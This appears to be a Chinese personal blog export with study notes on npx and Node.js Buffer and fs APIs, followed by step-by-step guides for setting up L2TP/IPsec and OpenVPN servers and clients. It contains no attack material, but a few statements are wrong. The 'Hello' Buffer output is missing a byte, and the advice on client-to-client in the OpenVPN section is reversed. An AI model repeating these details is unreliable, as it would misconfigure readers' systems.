npx想要解决的主要问题就是调用项目内部安装的模块。npx 的原理很简单，就是运行的时候，会到node_modules&#x2F;.bin路径和环境变量$PATH里面，检查命令是否存在。 比如，项目内部安装了测试工具webpack：npm install webpack -D（这里的-D是把依赖安装到开发依赖的意思）。如果我们使用webpack，只能在项目脚本的 package.json 中的scripts字段里面， 如果想在命令行下调用，必须像这样：node-modules/.bin/webpack -v。而npx 可以让项目内部安装的模块用起来更方便，只要像下面这样调用就行了：npx webpack -v。下载全局模块时，npx 允许指定版本：npx webpack@4.44.1 ./src/index.js -o ./dist/main.js。此代码指定使用 4.44.1 版本的webpack进行打包操作。 注意，只要 npx 后面的模块无法在本地发现，就会下载同名模块。比如，本地没有安装webpack-dev-server模块，npx webpack-dev-server命令会自动下载该模块，在当前目录启动一个 Webpack dev 服务。如果想让 npx 强制使用本地模块，不下载远程模块，可以使用–no-install参数。如果本地不存在该模块，就会报错。npx --no-install webpack-dev-server。反过来，如果忽略本地的同名模块，强制安装使用远程模块，可以使用--ignore-existing参数。比如，本地已经全局安装了create-react-app，但还是想使用远程模块，就用这个参数：npx --ignore-existing create-react-app my-react-app。 由于 npx 会检查环境变量$PATH，所以系统命令也可以调用：npx ls // 等同于ls命令。 另外,使用npx可以避免全局安装模块，比如，create-react-app这个模块是全局安装，npx 可以运行它，而且不进行全局安装：npx create-react-app my-react-app。上面代码运行时，npx 将create-react-app下载到一个临时目录，使用以后再删除。所以，以后再次执行上面的命令，会重新下载create-react-app。 还可以利用 npx 指定某个版本的 Node 运行脚本。npx node@14.10.0 -v命令会使用 14.10.0 版本的 Node 执行脚本。原理是从 npm 下载这个版本的 node，使用后再删掉。某些场景下，这个方法用来切换 Node 版本，要比 nvm 那样的版本管理器方便一些。 Buffer（缓冲区） JS已经有数组了，为什么还需要Buffer？JS的数组功能虽然也很强大，可以存储数字、字符串等各种数据类型，但在客户端和服务器的通信过程中，客户端给服务器发请求，服务器给客户端返回响应。如果服务器返回的是图片或者音视频文件，传统的数组array无法存储这些。要存储这些二进制文件，就要用到buffer。 buffer构造函数都是不推荐使用的，官网标注为“已废弃”。buffer的大小一旦确定则不能修改。buffer实际上是对底层内存的直接操作。Buffer的结构和数组很像，操作的方法也和数组类似，它的元素是十六进制的两位数，范围是00 - ff。）不过数组中不能存储二进制的文件，而buffer就是专门用来存储二进制数据的，它只不过都是以十六进制的形式显示，由计算机的特性决定，因为二进制看起来太长了。 如果将一个字符串保存到buffer中：var str = &quot;Hello&quot; var buf = Buffer.from(str)，再对buf进行打印，结果为&lt;Buffer 48 65 6c 6c&gt;。 为什么是到ff，也就是255？因为在计算机中，一个0或一个1我们称之为是一位（1bit）。而8bit&#x3D;1byte（字节）。也就是buffer中的一个元素就占用内存的一个字节。 注意，只要数字在控制台或页面中输出一定是10进制。 需要注意的是，buf.length获取的是占用内存的大小，单位为byte。而str.length指的是字符串的长度。当字符串中的字符存在中文时既有明显的差别。Buffer是nodejs的核心之一，使用buffer不需要引入模块，直接使用即可。 buffer的相关方法可以去Node.js中文网查看完整文档。 创建指定大小的buffer：var buf = Buffer.alloc(10) //创建一个10字节的buffer。会在内存中分配一个长度为10的连续空间，可以通过索引来操作buf中的元素：buf[2] = 0xaa。 还有个var buf = Buffer.allocUnSafe(10)，也是创建一个指定大小为10字节的buffer，但是buffer中可能含有敏感数据。也就是alloc分配空间的同时清空数据，但allocUnSafe只分配，不清空数据。 Buffer大小一旦确定，则不能修改；不会像数组一样如果给一个索引超出长度的元素赋值就直接把数组长度变大的情况。Buffer实际上是对底层内存的直接操作。alloc：allocate，分配。 将buffer缓冲区中的数据转换为字符串：buf.toString() FS（文件系统）文件系统简单来说就是通过node来操作系统中的文件。fs模块提供了一些标准文件访问API来打开、读取、写入文件以及与其交互。 注意在写文件路径时，路径里的单斜杠”\\“可能会被当作转义字符，导致不能正确读取文件路径。把单斜杠变成双斜杠\\\\即可。也可以换成向左的斜杠/。 要使用fs模块，首先需要对其进行加载：const fs = require(&quot;fs&quot;)。fs是核心模块，直接引入而无需下载。（buffer模块甚至不需要引入。） fs模块中所有的操作都有两种形式可以选择：同步和异步。去官网看它的方法，发现都是一对对的，一个带Sync的（同步方法）和 一个不带的（异步方法）。 同步文件系统会阻塞程序的执行，也就是除非操作完毕，否则不会向下执行代码。 异步文件系统不会阻塞程序的执行，而是在操作完成时通过回调函数将结果返回。 在方法的参数中，异步函数通常都有一个回调函数callback。因为异步函数需要通过回调函数在操作完成时返回结果，同步函数直接用return返回了。 同步和异步文件写入同步文件写入手动操作的步骤：1.打开文件 2.向文件中写入内容 3.保存并关闭文件。用fs，步骤如下： 打开文件：fs.openSync(path,flags[,mode]) path：要打开文件的路径 flags：打开文件要做的操作的类型。r - 只读的 w - 可写的 mode：设置文件的操作权限，一般不传 返回值：该方法会返回一个文件的描述符作为结果，可以通过该描述符对文件进行各种操作。 向文件中写入内容：fs.writeSync(fd,string[,position[,encoding]]) fd：文件的描述符，需要传递要写入的文件的描述符 string：要写入的内容 position：写入的起始位置，一般不传 encoding：写入的编码，默认utf-8。一般不传 保存并关闭文件：fs.closeSync(fd) fd：要关闭的文件的描述符 异步文件写入异步调用的方法，结果都是通过回调函数的参数arguments返回的。异步文件写入的步骤如下： 打开文件：fs.open(path,flags[,mode],callback)。比同步就多了个callback。 callback：不可省略！ 回调函数的两个参数：1.err：错误对象，没出错则为null 2.fd：文件的描述符。 异步写入文件：fs.write(fd,string[,position[,encoding]],callback)。在打开文件的回调函数中，如果没有出错，则对文件进行写入操作。回调函数的两个参数：1.err：错误对象，没出错则为null 2.written：指定传入的字符串被写入多少字节。3.string：写入的内容。后面两个参数意义不大，写入内容在fs.write的参数中控制。 保存并关闭文件：fs.close(fd) callback：不可省略！ 回调函数只有一个可能的异常参数。 简单文件写入第一种：fs.writeFile(file,data[,options],callback)第二种：fs.writeFileSync(file,data[,options]) file：要操作的文件的路径 data：要写入的数据 options：选项，可以对写入进行一些设置 callback：当写入完成后执行的函数 用法如下： 123456var fs = require(&quot;fs&quot;)fs.writeFile(&quot;hello.txt&quot;, &#x27;这是通过writeFile写入的内容&#x27;, &#123;flag:&quot;w&quot;&#125;, function(err)&#123; if(!err)&#123; console.log(&#x27;写入成功！&#x27;) &#125;&#125;)； options的几个可选值如下：常用的有r, r+, w, a。注意w是截断，a可以追加。r+如果输入的内容少于之前的，则从左往右替换，剩余的依然存在；如果多余之前的则全部替换之前的内容；是从头开始替换原文本而非插入。 流式文件写入以上几种写入都存在一个问题，就是它们是一次性的将一个内容写入一个文件里，因此在写入之前需要把要写入的东西一下子全部准备好。如果文件过大、内容过多，就会导致占用内存过大。同步、异步和简单文件写入，都不适合大文件的写入。性能较差，容易导致内存溢出。流式文件写入就相当于往文件上加了个水管。只要水管还在，就可以一直输送内容。 创建一个可写流：fs.createWriteStream(path[,options])。 path：文件路径 options：配置的参数 可以通过监听流的open.close事件来监听流的打开和关闭：流名.on(&quot;open&quot;,callback)，或把open换成close。但open事件只会触发一次，因为打开只有一次，而事件触发完之后函数依然在。这就说明，open事件是一个一次性的事件，没有必要用on，而是用流名.once(&quot;open&quot;,callback)。close同理。 on(事件字符串，回调函数)：可以为对象绑定一个事件 once(事件字符串，回调函数)：可以为对象绑定一个一次性的事件，该事件将会在触发一次以后自动失效。 上面的on是jquery里的写法，适用于绑定一个长期有效的事件。而once用来绑定一个一次性的事件。在这里使用这两个，运行效果是一样的。 关闭流：流名.end();。如果把流的传输想象成水缸A的水通过一个管子流向水缸B，这个方法相当于把管子从A拿走了，但另一头还在B，开始传输的东西会继续传输完才会完全关闭流。还有一个方法是流名.close()，这个方法就相当于把管子从B拿走，性能和计算机性能有关，性能好的话close()没执行就已经向文件写完了，所以会出现正常全部写入的情况。但性能不好的话，可能就无法传输完要传输的内容，流就已经关闭了。 用法如下： 1234567891011var fs = require(&quot;fs&quot;)var ws = fs.createWriteStream(&quot;hihi.txt&quot;) // 这就创建了可写流// 监听可写流的开启和关闭ws.once(&quot;open&quot;, function () &#123; console.log(&quot;流打开了&quot;); &#125;);ws.once(&quot;close&quot;, function () &#123; console.log(&quot;流关闭了&quot;); &#125;);ws.write(&quot;通过可写流写入文件的内容&quot;)ws.write(&quot;又写了&quot;)ws.write(&quot;又又写了&quot;)ws.close(); 同步和异步文件读取类似同步和异步文件的写入过程，先open，再fs.read()或fs.readSync()，再close。 简单文件读取通过fs.readFile(path[,options],callback)和fs.readFileSync(path[,options])。 path：要读取的文件的路径 options：读取的选项（操作符、权限等），一般不写 callback：回调函数，通过回调函数将读取到的内容返回(err,data) err：错误对象 data：读取到的数据，会返回一个buffer。如果是文本文件，可以通过data.toString()来转换成正常的结果。如果是图片等其它类型的文件，就体现出buffer的好处了。 用法如下： 123456789101112var fs = require(&quot;fs&quot;)fs.readFile(&quot;test.jpg&quot;,function(err,data)&#123; if(!err)&#123; // 1.打印读取到的内容： // console.log(data.toString()); // 2.将data写入到文件中 fs.writeFile(&quot;hihi.jpg&quot;,data,function(err)&#123; if(!err)&#123; console.log(&quot;图片文件写入成功！&quot;);&#125; &#125;) &#125;&#125;) 流式文件读取(初级方法)流式文件读取也适用于一些比较大的文件，可以分多次将文件读取到内存中。如果要读取一个可读流的数据，必须要为可读流绑定一个data事件，data时间绑定完毕，它会自动开始读取数据；读取完了还会自动关闭，所以不需要专门去关闭可读流。关于读取到的数据的去向，可读流读取到的数据都是通过参数返回的，也就是下面示例的参数data（这个名字是我们自己起的）。而且参数是没有err的，因为这个事件一旦触发，就不可能再出错了。如果在打印data的地方同时打印console.log(data.length)，会发现结果是65536。 用法如下： 1234567891011121314151617181920212223var fs = require(&quot;fs&quot;)// 创建一个可读流读取数据var rs = fs.createReadStream(&quot;test.mp3&quot;) // 创建一个可写流接收数据var ws = fs.createWriteStream(&quot;hihi.mp3&quot;) // 监听【可读】流和【可写】流的开启和关闭rs.once(&quot;open&quot;, function () &#123; console.log(&quot;可读流打开了&quot;); &#125;);rs.once(&quot;close&quot;, function () &#123; console.log(&quot;可读流关闭了&quot;); // 数据读取完毕，在这里关闭可写流： ws.end();&#125;);ws.once(&quot;open&quot;, function () &#123; console.log(&quot;可写流打开了&quot;); &#125;);ws.once(&quot;close&quot;, function () &#123; console.log(&quot;可写流关闭了&quot;); &#125;);rs.on(&quot;data&quot;,function(data)&#123; // console.log(data); // 将读取到的数据写入到可写流 ws.write(data) // 不可以在这里关闭可写流ws.end()!这就会导致只读了一条数据就把可写流给关了。&#125;) 流式文件读取(简单方法)方法pipe()：将可读流中的内容直接输出到可写流中。不需要再额外执行操作关闭可读流和可写流，pipe()会自动完成。用法如下： 1234567891011121314var fs = require(&quot;fs&quot;)// 创建一个可读流读取数据var rs = fs.createReadStream(&quot;test.mp3&quot;) // 创建一个可写流接收数据var ws = fs.createWriteStream(&quot;hihi.mp3&quot;) // 监听【可读】流和【可写】流的开启和关闭rs.once(&quot;open&quot;, function () &#123; console.log(&quot;可读流打开了&quot;); &#125;);rs.once(&quot;close&quot;, function () &#123; console.log(&quot;可读流关闭了&quot;); &#125;);ws.once(&quot;open&quot;, function () &#123; console.log(&quot;可写流打开了&quot;); &#125;);ws.once(&quot;close&quot;, function () &#123; console.log(&quot;可写流关闭了&quot;); &#125;);// 简单方法：利用可读流的pipe()方法。在可读流和可写流中间架起一个管道，直接传输。rs.pipe(ws); fs模块的其他方法 验证路径是否存在：fs.existsSync(path)，返回boolean。可查看文件是否存在。异步方法已经弃用。 获取文件信息：fs.stat(path,callback)和fs.statSync(path)，返回一个对象，保存了当前对象状态的相关信息。 删除文件：fs.unlink(path,callback)和fs.unlinkSync(path)。 列出文件：fs.readdir(path,callback)和fs.readdirSync(path[,options])。读取一个目录的目录结构。回调函数的参数files是一个字符串数组，每一个元素就是一个文件或文件夹的名字。 截断文件，将文件修改为指定的大小：fs.truncate(path,len,callback)和fs.truncateSync(path,len)。这里的len是字节数。 建立目录：fs.mkdir(path[,mode],callback)和fs.mkdirSync(path[,mode])。 删除目录：fs.rmdir(path,callback)和fs.rmdirSync(path)。 重命名文件和目录：fs.rename(oldpath,newpath,callback)和fs.renameSync(oldpath,newpath)。 监视文件修改：fs.watchFile(filename[,options],listener)。","categories":[{"name":"后端","slug":"后端","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/"},{"name":"node.js","slug":"后端/node-js","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/node-js/"}],"tags":[{"name":"node.js","slug":"node-js","permalink":"https://avalooooooon.github.io/tags/node-js/"}]},{"title":"搭建L2TP-IPsec","slug":"搭建L2TP-IPsec","date":"2022-02-20T07:20:43.000Z","updated":"2022-02-20T07:20:43.000Z","comments":true,"path":"2022/02/20/搭建L2TP-IPsec/","link":"","permalink":"https://avalooooooon.github.io/2022/02/20/%E6%90%AD%E5%BB%BAL2TP-IPsec/","excerpt":"","text":"1. 前言虚拟专用网络（VPN，Virtual Private Network）是一种网络底层协议，主机开启 VPN 后，所有网络请求都会先发送到 VPN 服务器，然后 VPN 服务器作为代理帮我们访问敏感资源。本文介绍如何在 Linux（Ubuntu 18.04）服务器上搭建 L2TP&#x2F;IPsec VPN。 1.5 在自己的终端配置连接服务器：ssh root@服务器ip -p 端口号查看配置文件：cat /etc/ssh/sshd_config修改配置文件：vim /etc/ssh/sshd_config 2. IPSec互联网安全协议（IPsec，Internet Protocol Security）是 OSI 第三层的安全协议，工作分传输模式和隧道模式，传输模式为自己传输信息，隧道模式为给上层协议提供安全隧道。此处使用隧道模式给上层 VPN 协议提供安全隧道。软件使用开源的 libreswan。 安装： 1sudo apt-get install libreswan 验证安装成功： 1ipsec --version 新建软件配置文件： 1sudo vim /etc/ipsec.d/l2tp-ipsec.conf 写入： 1234567891011121314151617conn L2TP-PSK-NAT rightsubnet=vhost:%priv also=L2TP-PSK-noNATconn L2TP-PSK-noNAT authby=secret pfs=no auto=add keyingtries=3 rekey=no ikelifetime=8h keylife=1h type=transport left=&lt;服务器公网 IP&gt; leftprotoport=17/1701 right=%any rightprotoport=17/%any 新建预共享密钥文件： 1sudo vim /etc/ipsec.d/l2tp-ipsec.secrets 写入： 1&lt;服务器公网 IP&gt; %any : PSK &quot;&lt;IPSec 密钥&gt;&quot; 编辑系统配置文件： 1sudo vim /etc/sysctl.d/99-ipsec.conf 末尾添加： 12345678910net.ipv4.ip_forward = 1net.ipv4.conf.default.rp_filter = 0net.ipv4.conf.all.send_redirects = 0net.ipv4.conf.default.send_redirects = 0net.ipv4.conf.all.log_martians = 0net.ipv4.conf.default.log_martians = 0net.ipv4.conf.default.accept_source_route = 0net.ipv4.conf.all.accept_redirects = 0net.ipv4.conf.default.accept_redirects = 0net.ipv4.icmp_ignore_bogus_error_responses = 1 更新系统配置： 1sudo sysctl -p 试运行： 12sudo systemctl start ipsecipsec verify 可添加至开机启动： 1sudo systemctl enable ipsec 3. PPPL2TP 协议基于 PPP 协议，因此需先确保 PPP 协议正常运行。 安装： 1sudo apt-get install ppp 新建配置文件： 1sudo vim /etc/ppp/options.xl2tpd 写入： 1234567891011121314require-mschap-v2ms-dns 8.8.8.8ms-dns 8.8.4.4asyncmap 0authcrtsctslockhide-passwordmodemdebugname l2tpdproxyarplcp-echo-interval 30lcp-echo-failure 4 编辑 PPP 用户名及密码文件： 1sudo vim /etc/ppp/chap-secrets 末尾添加： 1&lt;用户名&gt; * &lt;密码&gt; * 4. L2TP第二层隧道协议（L2TP，Layer 2 Tunneling Protocol）顾名思义是一个OSI 第二层协议。软件使用开源的 xl2tpd。 安装： 1sudo apt-get install xl2tpd 编辑配置文件： 1sudo vim /etc/xl2tpd/xl2tpd.conf 末尾添加： 1234567891011[global]ipsec saref = yes[lns default]ip range = 10.1.2.2-10.1.2.254local ip = 10.1.2.1refuse chap = yesrefuse pap = yesrequire authentication = yesppp debug = yespppoptfile = /etc/ppp/options.xl2tpdlength bit = yes 试运行： 1sudo systemctl start xl2tpd 然后在用户机上尝试连接 VPN，协议选择 L2TP，密钥、用户名和密码分别为刚才设置的 IPSec 密钥、PPP 用户名和 PPP 密码。应该能够连接成功，但还不能访问互联网。 可添加至开机启动： 1sudo systemctl enable xl2tpd 查看l2tp日志： 1systemctl status xl2tpd 5. 系统防火墙使用系统自带的 iptables 软件管理系统防火墙。 向 iptables 缓存添加策略，在其 NAT 表的 POSTROUTING 链中设置 IP 伪装： 1sudo iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o eth0 -j MASQUERADE -m comment --comment &quot;xl2tp&quot; 将当前策略保存至配置文件，然后应用策略： 12sudo iptables-save &gt; /etc/network/iptablessudo iptables-apply -w /etc/network/iptables ptables-persistant netfilter-persistant然后netfilter-persistant save就能持久化 centos7:&#x2F;etc&#x2F;sysconfig&#x2F;iptables 重启 xl2tpd 服务： 1sudo systemctl restart xl2tpd 此时用户机应该就能通过 VPN 访问互联网了。 可修改网络配置文件，使连接网络时自动加载 iptables 配置： 1sudo vim /etc/network/interfaces 末尾添加： 1pre-up iptables-restore &lt; /etc/network/iptables 6. 参考资料 centos7 搭建 xl2tpd 服务 Ubuntu iptables 配置","categories":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/categories/vpn/"}],"tags":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/tags/vpn/"}]},{"title":"OpenVPN","slug":"OpenVPN","date":"2022-02-20T06:10:04.000Z","updated":"2022-02-20T06:10:04.000Z","comments":true,"path":"2022/02/20/OpenVPN/","link":"","permalink":"https://avalooooooon.github.io/2022/02/20/OpenVPN/","excerpt":"","text":"简介OpenVPN 是基于 TLS 加密层实现 VPN 的开源项目。 安装在自己的终端配置连接服务器：ssh root@服务器ip -p 端口号查看配置文件：cat /etc/ssh/sshd_config修改配置文件：vim /etc/ssh/sshd_config Linux 服务端(debian10)登录服务端：除了ssh方式，也可以通过用户名密码方式。参考了这篇文章。端口号可以在服务器后台查阅ssh server。 1ssh -p port user@IP 安装软件包（包含客户端与服务端）： 12sudo apt-get update &amp;&amp; sudo apt-get install openvpnopenvpn --version # 验证 生成自签 CA、服务器证书及额外所需密钥： 123456789101112131415161718192021222324252627282930313233343536373839404142434445cd /etc/openvpn sudo cat &lt;&lt;EOF | sudo tee openvpn.cnf[ v3_ca ]basicConstraints = critical, CA:TRUEsubjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, cRLSign, digitalSignature, keyCertSign [ v3_ica ]basicConstraints = critical, CA:TRUE, pathlen:1subjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, cRLSign, digitalSignature, keyCertSign [ v3_server ]basicConstraints = critical, CA:FALSEsubjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, nonRepudiation, digitalSignature, keyEncipherment, keyAgreement extendedKeyUsage = critical, serverAuth [ v3_client ]basicConstraints = critical, CA:FALSEsubjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always, issuer:alwayskeyUsage = critical, nonRepudiation, digitalSignature, keyEnciphermentextendedKeyUsage = critical, clientAuthEOF sudo openssl genrsa -out ca.key 4096sudo openssl rand -writerand ~/.rndsudo openssl req -new -key ca.key -subj &quot;/CN=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=ca/emailAddress=admin@example.com&quot; -out ca.csrsudo openssl x509 -req -days 36500 -signkey ca.key -extfile openvpn.cnf -extensions v3_ca -in ca.csr -out ca.crtsudo rm ca.csr sudo openssl genrsa -out server.key 4096sudo openssl rand -writerand ~/.rndsudo openssl req -new -key server.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=server/emailAddress=admin@example.com&quot; -out server.csrsudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_server -in server.csr -out server.crtsudo rm server.csr sudo openssl dhparam -out dh.key 2048 # 此步将耗时数分钟 sudo openvpn --genkey --secret ta.key # 用于 OpenVPN TLS-auth 功能的密钥 从例子拷贝配置文件： 123cd /etc/openvpnsudo cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .sudo gzip -d server.conf.gz 由于版本不同，server.conf的路径也可能不同。如果上述路径找不到server.conf文件，可以尝试路径&#x2F;etc&#x2F;openvpn&#x2F;server&#x2F;server.conf。比如openvpn版本为2.4.11时，可以将命令修改如下：cp -p /usr/share/doc/openvpn-2.4.11/sample/sample-config-files/server.conf /etc/openvpn/cat /etc/openvpn/server.conf 修改配置文件： 1vim server.conf 修改 port(默认为1194，可以出现问题再修改，但要和客户端保持一致）。 修改协议为 UDP。 检查 ca：ca.crt、cert：server.crt、key：server.key、dh：dh.key、tls-auth：ta.key相对于配置文件夹的相对路径（或绝对路径）。注意检查每种证书只在一行出现，否则后面的行会覆盖掉前面行的值(tls-auth：ta.key的位置较为靠后）。 注释掉explicit-exit-notify 1（该功能仅用于 UDP 模式）。 启动服务： 1sudo systemctl start openvpn@server 开启系统转发功能： 1234cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/99-openvpn.confnet.ipv4.ip_forward = 1EOFsudo sysctl --system 配置 iptables 转发： 1sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE -m comment --comment &quot;openvpn&quot; 查看服务器日志： 1systemctl status openvpn@server Linux 客户端安装软件包同服务端。 生成密钥文件client.key及证书请求文件client.csr： 1234cd /etc/openvpnsudo openssl genrsa -out client.key 4096sudo openssl rand -writerand ~/.rndsudo openssl req -new -key client.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=client/emailAddress=admin@example.com&quot; -out client.csr OpenVPN 服务器会将 CN 名作为多个客户端时的区分标志，客户端应各自使用不同的 CN 名。 将client.csr拷贝至 CA 端： 123cd /etc/openvpnrm client.csr vim client.csr 由 CA 端签发证书client.crt： 1sudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_client -in client.csr -out client.crt 将client.crt及ca.crt、ta.key拷贝至客户端，直接复制文本内容即可： 123cat client.crtcat ca.crtcat ta.key CA 端可清除文件： 1sudo rm client.csr client.crt client 端可清除文件： 1sudo rm client.csr 复制配置文件： 12cd /etc/openvpnsudo cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf . 修改配置文件： 修改 remote 为服务器地址及 port。 修改协议为 UDP！。 检查 ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key相对于配置文件夹的相对路径。 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 启动服务： 1sudo systemctl start openvpn@client ping VPN 网关进行测试： 1ping 10.8.0.1 Windows 客户端去官网-&gt;Community-&gt;Downloads 下载 OpenVPN GUI 安装器并安装。 配置方法与 Linux 几乎一致。只是配置文件夹为%USERPROFILE%/OpenVPN/config，客户端配置模版文件为C:/Program Files/OpenVPN/sample-config/client.ovpn。 生成密钥文件client.key及证书请求文件client.csr： 1234cd C:\\Users\\28422\\OpenVPN\\configopenssl genrsa -out client.key 4096openssl rand -writerand .rnd # 配置文件夹就地新建.rnd随机数种子openssl req -new -key client.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=client2/emailAddress=admin@example.com&quot; -out client.csr # gitbash会报错，需要在powershell中运行 OpenVPN 服务器会将 CN 名作为多个客户端时的区分标志，客户端应各自使用不同的 CN 名。 将client.csr拷贝至 CA 端： 123cd /etc/openvpnrm client.csr vim client.csr 由 CA 端签发证书client.crt： 1sudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_client -in client.csr -out client.crt 将client.crt及ca.crt、ta.key拷贝至客户端，直接复制文本内容即可： 123cat client.crtcat ca.crtcat ta.key CA 端可清除文件： 1sudo rm client.csr client.crt client 端可清除文件： 1rm client.csr 修改配置文件C:&#x2F;Program Files&#x2F;OpenVPN&#x2F;sample-config&#x2F;client.ovpn： 修改 remote 为服务器地址及 port。 修改协议为UDP。 检查 ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key相对于配置文件夹的相对路径。 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 在可视化界面中启动服务即可。 Mac 客户端安装软件OpenVPN Connect。 生成密钥文件client.key及证书请求文件client.csr： 12345cd /Applicationscd &quot;OpenVPN Connect&quot;sudo openssl genrsa -out client.key 4096sudo openssl rand -out .rnd 1sudo openssl req -new -key client.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=client/emailAddress=admin@example.com&quot; -out client.csr OpenVPN 服务器会将 CN 名作为多个客户端时的区分标志，客户端应各自使用不同的 CN 名。 将client.csr拷贝至 CA 端： 123cd /etc/openvpnrm client.csr vim client.csr 由 CA 端签发证书client.crt： 1sudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_client -in client.csr -out client.crt 将client.crt及ca.crt、ta.key拷贝至客户端，cat查看后直接复制文本内容即可，用sudo vim xx.xxx的格式填入内容： 123cat client.crtcat ca.crtcat ta.key CA 端可清除文件： 1sudo rm client.csr client.crt client 端可清除文件： 1sudo rm client.csr 修改配置文件client.ovpn： 修改 remote 为服务器地址及 port。 修改协议为 UDP。 检查 ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key相对于配置文件夹的相对路径。 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 在OpenVPN Connect启动服务。 ios客户端安装软件OpenVPN Connect。 修改配置文件client.ovpn之前的工作和mac客户端完全相同。 修改配置文件client.ovpn： 修改 remote 为服务器地址及 port。 修改协议为 UDP。 在pc端会指定密钥或证书文件 ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key等。但是删除该部分。如果指定了tls-auth ta.key 1，则将其替换为key-direction 1。在删除相关内容后，具体的替换操作如下：12345678910111213&lt;ca&gt;ca.crt文件内容&lt;/ca&gt;&lt;cert&gt;client.crt文件内容&lt;/cert&gt;&lt;key&gt;client.key文件内容&lt;/key&gt;key-direction 1&lt;tls-auth&gt;ta.key文件内容&lt;/tls-auth&gt; 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 这是一个去掉无用注释的正确配置文件格式（具体内容可能有所差别）(网上别人给出来的，我实际用的是从mac的配置文件改的，和这个有点区别）： 1234567891011121314151617181920212223242526dev tunproto udpremote 88.88.88.88 1195cipher AES-128-CBCauth SHA1resolv-retry infinitenobindpersist-keypersist-tunclientverb 3&lt;ca&gt;-----BEGIN CERTIFICATE-----0MC2Hb46TpSi125sC8KKfP-----END CERTIFICATE-----&lt;/ca&gt;&lt;cert&gt;-----BEGIN CERTIFICATE-----+mZhYPGRKXKSJI6s0Egg/Cri+Cwk4bjJfrb5-----END CERTIFICATE-----&lt;/cert&gt;&lt;key&gt;-----BEGIN RSA PRIVATE KEY-----wmE9Mmlbq1emDeROivjCfoG-----END RSA PRIVATE KEY-----&lt;/key&gt; 在OpenVPN Connect启动服务。 使用系统服务开机自启开机自启脚本/etc/init.d/openvpn会扫描/etc/openvpn/xxx.conf并为每个配置文件启动一个同名的 openvpn@xxx 系统服务。可编辑/etc/default/openvpn文件的 AUTOSTART 项，选择性地开启配置自启。 客户端 IP 分配服务端配置文件的 ifconfig-pool-persist 项设置了客户端 IP 持久化记录文件，默认为/var/log/openvpn/ipp.txt，但此文件仅用于 OpenVPN 自己回写动态分配给各客户端的 IP，并不应通过该文件配置。正确方法是为服务端配置文件添加 client-config-dir ccd，然后新建/etc/openvpn/ccd客户端静态 IP 配置文件夹，在其中新建以客户端 CN 命名的配置文件。 12345cd /etc/openvpnsudo mkdir ccdsudo cat &lt;&lt;EOF | sudo tee ccd/clientifconfig-push 10.8.0.5 10.8.0.6EOF 其中 ifconfig-push 第一个参数为分配给客户端的 IP，第二个参数为隧道对端 IP。为了与 Windows 客户端的 TAP-Windows 驱动兼容，两 IP 应位于统一/30子网，且各客户端应分属不同/30子网，例如此处 IP 为10.8.0.5 10.8.0.6，下个客户端 IP 就至少为10.8.0.9 10.8.0.10。 客户端互访注释掉服务端配置文件的 client-to-client，即可实现连接到同一 OpenVPN 服务端的客户端通过 VPN IP 互访。 参考资料 OpenVPN 官网 OpenSSL 添加 x509 扩展 OpenVPN KeyUsage 扩展 